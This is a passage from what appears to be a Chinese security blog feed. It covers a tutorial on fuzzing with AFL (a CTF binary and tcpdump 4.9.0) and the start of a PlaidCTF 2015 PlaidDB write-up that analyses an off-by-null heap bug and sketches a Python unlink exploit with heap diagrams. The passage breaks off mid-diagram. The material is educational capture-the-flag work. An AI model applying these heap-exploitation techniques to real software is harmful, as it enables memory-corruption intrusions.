    afl-whatsupafl-clang       afl-cmin        afl-g++         afl-gotcpu      afl-qemu-trace  afl-tmin</code></pre><p>记录几个常用的命令：</p><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center"><code>afl-analyze</code></td><td style="text-align:center">以指定输入为基础对程序进行分析识别出程序合法输入的轮廓</td></tr><tr><td style="text-align:center"><code>afl-clang++</code>/<code>afl-clang</code></td></tr><tr><td style="text-align:center"><code>afl-cmin</code></td><td style="text-align:center">尝试找到与测试样例全集具有相同覆盖范围的最小子集</td></tr><tr><td style="text-align:center"><code>afl-fuzz</code></td><td style="text-align:center">AFL 进行 Fuzzing 的主程序</td></tr><tr><td style="text-align:center"><code>afl-g++</code>/<code>afl-gcc</code></td><td style="text-align:center">编译生成的文件可以通过设置 <code>LD_LIBRARY_PATH</code> 让程序加载经过 AFL 插桩的 <code>.so</code> 文件；或者可以直接加上 <code>--disable-shared</code> 进行静态编译</td></tr><tr><td style="text-align:center"><code>afl-gotcpu</code></td><td style="text-align:center">用于查看每个核心使用状态</td></tr><tr><td style="text-align:center"><code>afl-plot</code></td><td style="text-align:center">用于绘制各种状态指标的直观变化趋势</td></tr><tr><td style="text-align:center"><code>afl-showmap</code></td><td style="text-align:center">跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组</td></tr><tr><td style="text-align:center"><code>afl-tmin</code></td><td style="text-align:center">减小单个输入样例的大小</td></tr><tr><td style="text-align:center"><code>afl-whatsup</code></td><td style="text-align:center">用于查看每个 fuzzer 的运行状态和总体运行概况，加上 <code>-s</code> 选项只显示概况，其中的数据都是所有 fuzzer 的总和</td></tr></tbody></table><h1 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h1><p>本文主要记录怎么用 Fuzzing 对 PWN 题漏洞点寻找。首先可以在当前目录下新建一个文件夹 <code>in</code>，然后使用 tee 来记录下手动输入的一些测试样例：</p><pre><code class="bash">tee in/pattern.txt | ./binary</code></pre><p>接下来可以直接使用 <code>afl-fuzz</code> 对程序 Fuzzing。其中 <code>-i</code> 指定输入目录，<code>-o</code> 指定输出目录，<code>-Q</code> 表示使用 QEMU 模式：</p><pre><code class="bash">afl-fuzz -i in -o out -Q -- ./binary</code></pre><p>运行的时候可能会报错：</p><pre><code class="bash">afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;[+] You have 1 CPU core and 1 runnable tasks (utilization: 100%).[*] Checking core_pattern...[-] Hmm, your system is configured to send core dump notifications to an    external utility. This will cause issues: there will be an extended delay    between stumbling upon a crash and having this information relayed to the    fuzzer via the standard waitpid() API.    To avoid having crashes misinterpreted as timeouts, please log in as root    and temporarily modify /proc/sys/kernel/core_pattern, like so:    echo core &gt;/proc/sys/kernel/core_pattern[-] PROGRAM ABORT : Pipe at the beginning of &#39;core_pattern&#39;         Location : check_crash_handling(), afl-fuzz.c:7275</code></pre><p>在执行 <code>afl-fuzz</code> 前，如果系统配置为将核心转储文件（core）通知发送到外部程序，将导致将崩溃信息发送到 Fuzzer 之间的延迟增大，进而可能将崩溃被误报为超时，所以得临时修改 core_pattern 文件：</p><pre><code class="bash">echo core | sudo tee /proc/sys/kernel/core_pattern</code></pre><p>接下来就可以开始 Fuzz：</p><p><img src="/pics/Fuzzing-to-Exploit/2.png" srcset="/img/loading.gif" alt></p><p>状态窗口中“cycles done”字段颜色的颜色可以作为何时停止测试的参考。随着周期数不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。当其变为绿色时，继续 Fuzzing 下去也很难有新的发现了，这时便可以通过 Ctrl-C 停止 <code>afl-fuzz</code>。在输出的 <code>out</code> 文件夹下的 <code>crashes</code>，可以看到测试得到使程序 crash 的几个样例：</p><pre><code class="bash">➜  crashes lsid:000000,sig:06,src:000000,op:havoc,rep:2  id:000001,sig:06,src:000000,op:havoc,rep:4  id:000002,sig:06,src:000000,op:havoc,rep:2  README.txt</code></pre><p>使用 <code>afl-tmin</code> 可以获得最小的测试样例：</p><pre><code class="bash">afl-tmin -i out/crashes/xxx -o min -Q -- ./binary</code></pre><h1 id="Plaid-CTF-2015-PlaidDB"><a href="#Plaid-CTF-2015-PlaidDB" class="headerlink" title="Plaid-CTF-2015-PlaidDB"></a>Plaid-CTF-2015-PlaidDB</h1><p>以之前的一道题目为例。使用 <code>afl-fuzz</code> 对程序进行测试，跑了一段时间后可以得到几个使 crash 的结果：</p><pre><code>➜  crashes xxd id:000000,sig:06,src:000000,op:havoc,rep:20000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 4e4e 4e4e 0a30 0a47 4554 0a41  T.NNNNNN.0.GET.A0000020: 415a 4141 4141 4141 4141 4141 4141 4141  AZAAAAAAAAAAAAAA0000030: 4141 4141 4155 540a 410a                 AAAAAUT.A.➜  crashes xxd id:000001,sig:06,src:000000,op:havoc,rep:40000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 4e4e 4e4e 0a30 0a47 4554 0a58  T.NNNNNN.0.GET.X0000020: 4141 ae41 4141 4141 4141 4141 4141 4141  AA.AAAAAAAAAAAAA0000030: 4141 4139 4155 540a 410a                 AAA9AUT.A.➜  crashes xxd id:000002,sig:06,src:000000,op:havoc,rep:20000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 5554 0a4e 0a30 0a47 4554 0a41  T.NNUT.N.0.GET.A0000020: 4141 410a 4e0a 300a 4745 540a 4141 4141  AAA.N.0.GET.AAAA0000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA0000040: 4141 4141 0a                             AAAA.</code></pre><p>然后用 <code>afl-tmin</code> 来将样例最小化：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB xxd min0000000: 5055 540a 0a0a 5055 540a 0a0a 4745 540a  PUT...PUT...GET.0000010: 3030 3030 3030 3030 3030 3030 3030 3030  00000000000000000000020: 3030 3030 3030 3030 0a                   00000000.</code></pre><p>然后输入样例可以看到程序会 crash。发现程序在 free 的时候发现下一个 chunk 的 size 不合法，再经过一定的调试就可以定位到 Off-by-Null：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB cat min | ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Update successful.PROMPT: Enter command:PROMPT: Enter row key:ERROR: Row not found.*** Error in `./datastore&#39;: free(): invalid next size (fast): 0x000055f7ab2a20f0 ***[1]    21002 done       cat min |       21003 abort      ./datastore</code></pre><h1 id="tcpdump-4-9-0"><a href="#tcpdump-4-9-0" class="headerlink" title="tcpdump-4.9.0"></a>tcpdump-4.9.0</h1><p>这里再对 64 位的 tcpdump-4.9.0 进行了测试。在安装 tcpdump 之前要先安装 libpcap：</p><pre><code class="bash">wget http://www.tcpdump.org/release/libpcap-1.8.1.tar.gztar -zxvf libpcap-1.8.1.tar.gz &amp;&amp; cd libpcap-1.8.1./configuremakesudo make install</code></pre><p>然后使用用 <code>afl-gcc</code> 和 <code>afl-g++</code> 对 tcpdump 进行编译：</p><pre><code class="bash">wget http://www.tcpdump.org/release/tcpdump-4.9.0.tar.gztar -zxvf tcpdump-4.9.0.tar.gz &amp;&amp; cd tcpdump-4.9.0CC=afl-gcc CXX=afl-g++ ./configuremakesudo make install</code></pre><p>安装完后查看以下版本：</p><pre><code class="bash">$ tcpdump --versiontcpdump version 4.9.0libpcap version 1.8.1</code></pre><p>然后从 <a href="https://wiki.wireshark.org/SampleCaptures" target="_blank" rel="noopener">Wireshark 官网</a>上下载一些流量包，作为测试的样例，并使用 editcap 将每个流量包分成四份：</p><pre><code class="bash">$ for i in `ls` ; do editcap -c 4 $i Trimmed/trimm.pcap ; done$ ls Trimmed/ | wc -l32170</code></pre><p>然后用 <code>alf-cmin</code> 把测试样例再缩小。需要从文件中获取输入的话，可以使用“@@”代替被测试程序命令行中输入文件名的位置：</p><pre><code class="bash">$ afl-cmin -i Trimmed/ -o Pcap-corpus/ -- tcpdump -ee -vv -nnr @@corpus minimization tool for afl-fuzz by &lt;lcamtuf@google.com&gt;[*] Testing the target binary...[+] OK, 377 tuples recorded.[*] Obtaining traces for input files in &#39;Trimmed/&#39;...    Processing file 32170/32170...[*] Sorting trace sets (this may take a while)...[+] Found 13843 unique tuples across 32170 files.[*] Finding best candidates for each tuple...    Processing file 32170/32170...[*] Sorting candidate list (be patient)...[*] Processing candidates and writing output files...    Processing tuple 13843/13843...[+] Narrowed down to 380 files, saved in &#39;Pcap-corpus/&#39;.</code></pre><p>最后使用 <code>afl-fuzz</code> 对程序测试，可以使用 <code>screen</code> 把程序放在后台运行：</p><pre><code class="bash">$ screen afl-fuzz -i PCAPS/Pcap-corpus/ -o out -- tcpdump -ee -vv -nnr @@</code></pre><p><a href="https://countuponsecurity.com/2018/03/07/intro-to-american-fuzzy-lop-fuzzing-in-5-steps/" target="_blank" rel="noopener">据说</a>能跑出 CVE（CVE-2017-13044 和 CVE-2017-12989），我用学生服务器跑了一个多礼拜跑出了五个 hangs。不得不说大型的 Fuzz 还是比较依赖机器的性能的：</p><p><img src="/pics/Fuzzing-to-Exploit/3.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=jEHgm7S58N8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jEHgm7S58N8</a><br><a href="https://cool-y.github.io/2019/07/09/afl-first-try/" target="_blank" rel="noopener">https://cool-y.github.io/2019/07/09/afl-first-try/</a><br><a href="https://mp.weixin.qq.com/s/G7l5wBB7oKjXCDGtjuxYTQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/G7l5wBB7oKjXCDGtjuxYTQ</a><br><a href="https://mp.weixin.qq.com/s/WMfCNN095-PpM0VB_pRESg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/WMfCNN095-PpM0VB_pRESg</a><br><a href="https://0x00sec.org/t/fuzzing-projects-with-american-fuzzy-lop-afl/6498" target="_blank" rel="noopener">https://0x00sec.org/t/fuzzing-projects-with-american-fuzzy-lop-afl/6498</a><br><a href="https://countuponsecurity.com/2018/03/07/intro-to-american-fuzzy-lop-fuzzing-in-5-steps/" target="_blank" rel="noopener">https://countuponsecurity.com/2018/03/07/intro-to-american-fuzzy-lop-fuzzing-in-5-steps/</a><br><a href="https://countuponsecurity.com/2018/04/24/intro-to-american-fuzzy-lop-fuzzing-with-asan-and-beyond/" target="_blank" rel="noopener">https://countuponsecurity.com/2018/04/24/intro-to-american-fuzzy-lop-fuzzing-with-asan-and-beyond/</a><br><a href="https://blog.betamao.me/2019/02/04/Fuzz%E4%B9%8BAFL/" target="_blank" rel="noopener">https://blog.betamao.me/2019/02/04/Fuzz%E4%B9%8BAFL/</a><br><a href="https://blog.csdn.net/hejunqing14/article/details/50338161" target="_blank" rel="noopener">https://blog.csdn.net/hejunqing14/article/details/50338161</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AFL Fuzz 初体验。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
      <category term="fuzz" scheme="blog.b3ale.cn/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>2015-PlaidCTF-PlaidDB</title>
    <link href="blog.b3ale.cn/2020/04/12/2015-PlaidCTF-PlaidDB/"/>
    <id>blog.b3ale.cn/2020/04/12/2015-PlaidCTF-PlaidDB/</id>
    <published>2020-04-12T08:11:29.000Z</published>
    <updated>2020-04-16T02:23:59.380Z</updated>
    
    <content type="html"><![CDATA[<p>之前本来想写篇 Off-by-One 相关的，后来感觉理解了思想以后也不需要额外去多折腾什么了。这里记录一道比较复杂的题目。</p><a id="more"></a><h1 id="Binary-Analysis"><a href="#Binary-Analysis" class="headerlink" title="Binary Analysis"></a>Binary Analysis</h1><p>程序保护全开：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB checksec ./datastore[*] &#39;/home/b3ale/Heap-Exploitation/Plaid-CTF-2015-PlaidDB/datastore&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled</code></pre><p>尝试运行一下程序，大概是模拟了一个数据库，总共有 5 个功能，分别是 GET、PUT、DUMP、DEL 和 EXIT。PUT 用来新增列，读入数据内容时会把换行符（<code>&quot;\n&quot;</code>）也读进来；GET 用来获取对应列的信息；DUMP 获取所有被存入的列；DEL 删除列；EXIT 退出程序：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTPROMPT: Enter row key:AAAPROMPT: Enter data size:4PROMPT: Enter data:AAAAINFO: Insert successful.PROMPT: Enter command:ERROR: &#39;&#39; is not a valid command.PROMPT: Enter command:GETPROMPT: Enter row key:AAAINFO: Row data [4 bytes]:AAAAPROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [AAA], 4 bytesINFO: Row [th3fl4g], 8 bytesPROMPT: Enter command:DELPROMPT: Enter row key:th3fl4gINFO: Delete successful.PROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [AAA], 4 bytesPROMPT: Enter command:EXITINFO: Goodbye</code></pre><p>先用 IDA 来大概看看函数的大概实现。大体就是菜单题的样子，然后大概是用红黑树对数据进行存储，所以我站在前人的肩膀上把结构体改好了：</p><pre><code class="cpp">struct Node {    char *key;    long data_size;    char *data;    struct Node *left;    struct Node *right;    long dummy;    long dummy1;}</code></pre><p>其中 get 函数一开始获取输入的列名（这里我已经标出了 <code>vulread()</code>，在后面会再提到），然后遍历红黑树节点，对读入的 key 和指定节点上的 key 进行比较，如果相等的话会输出相应的 data。最后会把 key 的缓存给 free 掉：</p><pre><code class="cpp">void get(){  char *key; // rbp  struct Node *node; // rbx  int cmp_result; // eax  puts(&quot;PROMPT: Enter row key:&quot;);  key = vulread();  node = root;LABEL_2:  if ( node )  {    while ( 1 )    {      cmp_result = strcmp(key, node-&gt;key);      if ( cmp_result &lt; 0 )      {        node = node-&gt;left;        goto LABEL_2;      }      if ( !cmp_result )        break;      node = node-&gt;right;      if ( !node )        goto LABEL_6;    }    __printf_chk(1LL, &quot;INFO: Row data [%zd byte%s]:\n&quot;, node-&gt;data_size);    fwrite(node-&gt;data, 1uLL, node-&gt;data_size, stdout);    free(key);  }  else  {LABEL_6:    puts(&quot;ERROR: Row not found.&quot;);    free(key);  }}</code></pre><p>在 put 函数中，先读入一个 key，然后读入（saferead 中调用 fgets）数据的长度，然后读入指定长度的字符串（readn 用 read 实现）。最后把读入的结构体添加到红黑树中，在 insert_node 中判断节点是否出现过，若出现过就会 free 掉当前的节点，并更新旧的节点；若没有，则插入红黑树：</p><pre><code class="cpp">void put(){  void **chunk; // rbx  unsigned __int64 size; // rax  void *buf; // rax  struct Node *v3; // rbp  char size_1[24]; // [rsp+0h] [rbp-38h]  unsigned __int64 canary; // [rsp+18h] [rbp-20h]  canary = __readfsqword(0x28u);  chunk = (void **)malloc(0x38uLL);  if ( !chunk )    goto LABEL_10;  puts(&quot;PROMPT: Enter row key:&quot;);  *chunk = vulread();  puts(&quot;PROMPT: Enter data size:&quot;);  saferead(size_1, 16LL);  size = strtoul(size_1, 0LL, 0);  chunk[1] = (void *)size;  buf = malloc(size);  chunk[2] = buf;  if ( !buf )  {    puts(&quot;ERROR: Can&#39;t store that much data.&quot;);    free(*chunk);    if ( __readfsqword(0x28u) == canary )    {      free(chunk);      return;    }LABEL_10:    puts(&quot;FATAL: Can&#39;t allocate a row&quot;);    exit(-1);  }  puts(&quot;PROMPT: Enter data:&quot;);  readn(chunk[2], (size_t)chunk[1]);  v3 = (struct Node *)insert_node(chunk);  if ( v3 )  {    free(*chunk);    free(v3-&gt;data);    v3-&gt;data_size = (__int64)chunk[1];    v3-&gt;data = (char *)chunk[2];    free(chunk);    puts(&quot;INFO: Update successful.&quot;);  }  else  {    puts(&quot;INFO: Insert successful.&quot;);  }  if ( __readfsqword(0x28u) != canary )    goto LABEL_10;}</code></pre><p>dump 函数后序遍历红黑树并输出列名和数据长度：</p><pre><code class="cpp">struct Node *dump(){  struct Node *result; // rax  struct Node *node; // rbx  struct Node *n; // rax  puts(&quot;INFO: Dumping all rows.&quot;);  result = (struct Node *)&amp;root;  node = root;  if ( !root )    return result;  while ( node-&gt;left )    node = node-&gt;left;  while ( 1 )  {    while ( 1 )    {      node-&gt;data_size;      __printf_chk(1LL, &quot;INFO: Row [%s], %zd byte%s\n&quot;, node-&gt;key);      n = node-&gt;right;      if ( !n )        break;      do      {        node = n;        n = n-&gt;left;      }      while ( n );    }    result = node-&gt;dummy;    if ( !result || node != result-&gt;left )      break;LABEL_15:    node = result;  }  while ( result )  {    if ( node != result-&gt;right )      goto LABEL_15;    node = result;    result = result-&gt;dummy;  }  return result;}</code></pre><p>最后的 del 函数比较复杂，就不放太多代码了，因为主要操作是从红黑树中删除节点，最后会依次 free 掉节点的 key、节点的 data、节点本身以及输入的 key。不过如果没有找到指定的列，就不会把输入的 key 给 free 掉：</p><pre><code class="cpp">int del(){  puts(&quot;PROMPT: Enter row key:&quot;);  key = vulread();  node = root;LABEL_2:  if ( !node )  {LABEL_6:    puts(&quot;ERROR: Row not found.&quot;);    return;  }  while ( 1 )  {    key_1 = node-&gt;key;  ...LABEL_69:  LODWORD(n-&gt;dummy1) = 0;LABEL_29:  free(key_1);  free(node-&gt;data);  free(node);  free(key);  return puts(&quot;INFO: Delete successful.&quot;);}</code></pre><p>最后来看 vulread 这里，逐字节读取字符，判断如果读到换行符就 break。如果读入的长度大于 24，则会用 realloc 扩展一倍 chunk 的大小。读完指定长度之后会在字符串最后补上 <code>&quot;\x00&quot;</code>：</p><pre><code class="cpp">char *vulread(){  char *buf; // r12  char *end; // rbx  size_t cap; // r14  char c; // al  char c_1; // bp  signed __int64 idx; // r13  char *new_buf; // rax  buf = (char *)malloc(8uLL);  end = buf;  cap = malloc_usable_size(buf);                // 24  while ( 1 )  {    c = _IO_getc(stdin);    c_1 = c;    if ( c == -1 )      goodbye();    if ( c == &#39;\n&#39; )      break;    idx = end - buf;    if ( cap &lt;= end - buf )    {      new_buf = (char *)realloc(buf, 2 * cap);      buf = new_buf;      if ( !new_buf )      {        puts(&quot;FATAL: Out of memory&quot;);        exit(-1);      }      end = &amp;new_buf[idx];      cap = malloc_usable_size(new_buf);        // 48    }    *end++ = c_1;  }  *end = 0;                                   // off by one  return buf;}</code></pre><p>再用 ltrace 跟一下，大概地看看发生了哪些 malloc 和 free：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ltrace -e &#39;malloc+free+realloc+&#39; ./datastoredatastore-&gt;malloc(56)                                                   = 0x564b295ad010datastore-&gt;malloc(8)                                                    = 0x564b295ad050datastore-&gt;malloc(9)                                                    = 0x564b295ad070INFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x564b295ad090PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x564b295ad0d0APROMPT: Enter data size:0datastore-&gt;malloc(0)                                                    = 0x564b295ad0f0PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:DELPROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x564b295ad110Adatastore-&gt;free(0x564b295ad0d0)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad0f0)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad090)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad110)                                         = &lt;void&gt;INFO: Delete successful.PROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [th3fl4g], 8 bytesPROMPT: Enter command:EXITINFO: Goodbye+++ exited (status 0) +++</code></pre><h1 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h1><p>根据上面的分析，有用的信息大概如下几个：</p><ol><li>每个节点固定大小（<code>malloc(56)</code>）；</li><li><code>vulread()</code> 函数中有 <code>malloc()</code> 和 <code>realloc()</code>，可以用 <code>realloc()</code> 获取特定大小的 chunk；</li><li><code>vulread()</code> 里存在 Off by Null；</li><li>删除节点时，如果列名不存在，key 所对应的 chunk 不会被 free；</li><li>往节点中读入数据时的大小可控（<code>malloc(size)</code>）。插入节点时会进行判断，若新节点的 key 值不存在，则插入节点；若存在，则依次 free 新的 key、旧的 data、新的节点。存在节点时的 free 顺序如下：</li></ol><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ltrace -e &#39;malloc+free+realloc+&#39; ./datastoredatastore-&gt;malloc(56)                                                   = 0x55feff2f2010datastore-&gt;malloc(8)                                                    = 0x55feff2f2050datastore-&gt;malloc(9)                                                    = 0x55feff2f2070INFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x55feff2f2090PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x55feff2f20d0APROMPT: Enter data size:2datastore-&gt;malloc(2)                                                    = 0x55feff2f20f0PROMPT: Enter data:AINFO: Insert successful.PROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x55feff2f2110PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x55feff2f2150APROMPT: Enter data size:2datastore-&gt;malloc(2)                                                    = 0x55feff2f2170PROMPT: Enter data:Bdatastore-&gt;free(0x55feff2f2150)                                         = &lt;void&gt;datastore-&gt;free(0x55feff2f20f0)                                         = &lt;void&gt;datastore-&gt;free(0x55feff2f2110)                                         = &lt;void&gt;INFO: Update successful.PROMPT: Enter command:EXITINFO: Goodbye+++ exited (status 0) +++</code></pre><p>看过一遍后，漏洞点其实就在 <code>vulread()</code> 中。如果正好读满 24 字节，然后跟上换行，还会在最后面跟上一个 <code>&quot;\x00&quot;</code>，造成 Off by One（Off by Null）。不过找漏洞还有一种方法。本身程序这里红黑树的操作比较复杂，如果在不知道的情况下单纯地去逆会很难。所以可以对程序进行 Fuzz 来定位漏洞。用 AFL Fuzz 后可以得到会让程序 Crash 的 Payload：</p><pre><code>PUTA0DELAPUTNNNNNN0PUTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p>可以看到在 free 的时候提示了 <code>&quot;free(): invalid next size (fast)&quot;</code>，再经过一系列的调试就能判断出应该是溢出的 Null 字节盖到了下一个 chunk 的 size：</p><pre><code>➜  Plaid-CTF-2015-PlaidDB (cat crash.txt ; cat) | ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:PROMPT: Enter row key:INFO: Delete successful.PROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:GETPROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:GETPROMPT: Enter row key:AAAAAAAAAAAAAAAAAAAAAAAAERROR: Row not found.cat: -: Resource temporarily unavailable*** Error in `./datastore&#39;: free(): invalid next size (fast): 0x00005555557580d0 ***</code></pre><p>这里的 Off by Null 可以溢出盖到下一个 chunk 的 size 的最低一个字节，使得该 chunk 的 <strong>size 变小</strong>（shrink），同时也把 <strong>prev_inuse 置为 0</strong>；同时可以<strong>设置下一个 chunk 的 prev_size</strong>，然后就可以 unlink 拿到某个指针了。画了个草图，这里通过 chunk2 溢出修改 chunk3 的 prev_size 以及覆盖 size 的最低字节为 Null，将 chunk3 的 prev_inuse 置零的同时 shrink：</p><pre><code>                                    prev                            prev             size                   size     size                   size     size +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+ |        |   XX   |chunk1(freed)|   XX   |   XX |0|    chunk2   |   XX   |  XX+1|1|    chunk3   | +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+   prev   size     size +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+ |        |        |             |        |        |AAAAAAAAAAAAA|  2*XX  |   YY |0|        |    | +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+</code></pre><p>实现这样的构造之后，可以通过 GET 把 unlink 后的得到的 chunk 覆盖到的节点信息泄漏出来。然后可以把这个 chunk 作为 value，可以读入任意的数据，构造一些指针作为节点的结构体成员，用 GET 就可以任意读，用 PUT 可以任意写。</p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>下面大概记录一下怎么构造出 unlink。首先利用几个 PUT 对堆进行初步的布局：</p><pre><code class="python"># Off by Null + UnlinkPUT(&#39;3&#39;, &#39;&#39;)PUT(&#39;0&#39;, &#39;C&#39; * 0x80) # smallbin for unlinkPUT(&#39;1&#39;, &#39;&#39;) # chunk for overflowPUT(&#39;2&#39;, &#39;&#39;)PUT(&#39;1&#39;, &#39;A&#39; * 0xf8)</code></pre><p>结果大概如下，列 <code>&#39;1&#39;</code> 对应的部分会在最后一次 PUT 的时候被替换掉内容，会依次 free 掉 0x3a0、0x2c0、0x360 处的 chunk：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x170 - 0x10 |    0x40    | node &#39;0&#39; +------------+ 0x1b0 - 0x10 |    0x20    | &#39;0&#39; +------------+ 0x1d0 - 0x10 |    0x90    | &#39;C&#39; * 0x80 +------------+ 0x260 - 0x10 |    0x40    | node &#39;1&#39; +------------+ 0x2a0 - 0x10 |    0x20    | &#39;1&#39; +------------+ 0x2c0 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] +------------+ 0x2e0 - 0x10 |    0x40    | node &#39;2&#39; +------------+ 0x320 - 0x10 |    0x20    | &#39;2&#39; +------------+ 0x340 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x360 - 0x10 |    0x40    | node &#39;1&#39; =&gt; [freed] +------------+ 0x3a0 - 0x10 |    0x20    | &#39;1&#39; =&gt; [freed] +------------+ 0x3c0 - 0x10 |   0x100    | &#39;A&#39; * 0xf8 +------------+</code></pre><p>接下来 PUT 列 <code>&#39;2&#39;</code> 中的内容，用于之后的 unlink，同时伪造了一个 fastbin chunk，之后避免之后 shrink+free 后和 top chunk 合并：</p><pre><code class="python">PUT(&#39;2&#39;, &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18) # chunk for off-by-null ; fake a fastbin</code></pre><p>堆内存大概如下，此时有两个 0x20 的 fastbin 和一个 0x40 的 fastbin：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x170 - 0x10 |    0x40    | node &#39;0&#39; +------------+ 0x1b0 - 0x10 |    0x20    | &#39;0&#39; +------------+ 0x1d0 - 0x10 |    0x90    | &#39;C&#39; * 0x80 +------------+ 0x260 - 0x10 |    0x40    | node &#39;1&#39; +------------+ 0x2a0 - 0x10 |    0x20    | &#39;1&#39; +------------+ 0x2c0 - 0x10 |    0x20    | &#39;2&#39; -&gt; [freed] +------------+ 0x2e0 - 0x10 |    0x40    | node &#39;2&#39; +------------+ 0x320 - 0x10 |    0x20    | &#39;2&#39; +------------+ 0x340 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] +------------+ 0x360 - 0x10 |    0x40    | node &#39;2&#39; =&gt; [freed] +------------+ 0x3a0 - 0x10 |    0x20    | [freed] +------------+ 0x3c0 - 0x10 |   0x100    | &#39;A&#39; * 0xf8 +------------+ 0x4c0 - 0x10 |   0x120    | &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18 +------------+</code></pre><p>然后接下来触发 Off-by-Null，并且：</p><pre><code class="python">DEL(&#39;1&#39;)DEL(&#39;X&#39; * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_size=752DEL(&#39;0&#39;)DEL(&#39;2&#39;) # unlink</code></pre><p>smallbin 里会产生一块很大的 chunk，接下来就能 overlap 其中的 chunk，进行任意读、任意写：</p><pre><code> +------------+ 0x0f0 - 0x10                                    +------------+ |    0x40    | node &#39;3&#39;                                        |    0x40    | +------------+ 0x130 - 0x10                                    +------------+ |    0x20    | &#39;3&#39;                                             |    0x20    | +------------+ 0x150 - 0x10                                    +------------+ |    0x20    | &#39;&#39;                                              |    0x20    | +------------+ 0x170 - 0x10                                    +------------+ |    0x40    | node &#39;0&#39; =&gt; [freed]                             |    0x40    | +------------+ 0x1b0 - 0x10                                    +------------+ |    0x20    | &#39;0&#39; =&gt; [freed]                                  |    0x20    | +------------+ 0x1d0 - 0x10                       0x1d0 - 0x10 +------------+ |    0x90    | &#39;C&#39; * 0x80 =&gt; [freed]                           |   0x3f0    | +------------+ 0x260 - 0x10                                    +---- :: ----+ |    0x40    | node &#39;1&#39; =&gt; [freed]                             |     ::     | +------------+ 0x2a0 - 0x10                                    +---- :: ----+ |    0x20    | &#39;1&#39; =&gt; [freed]                                  |     ::     | +------------+ 0x2c0 - 0x10                                    +---- :: ----+ |    0x20  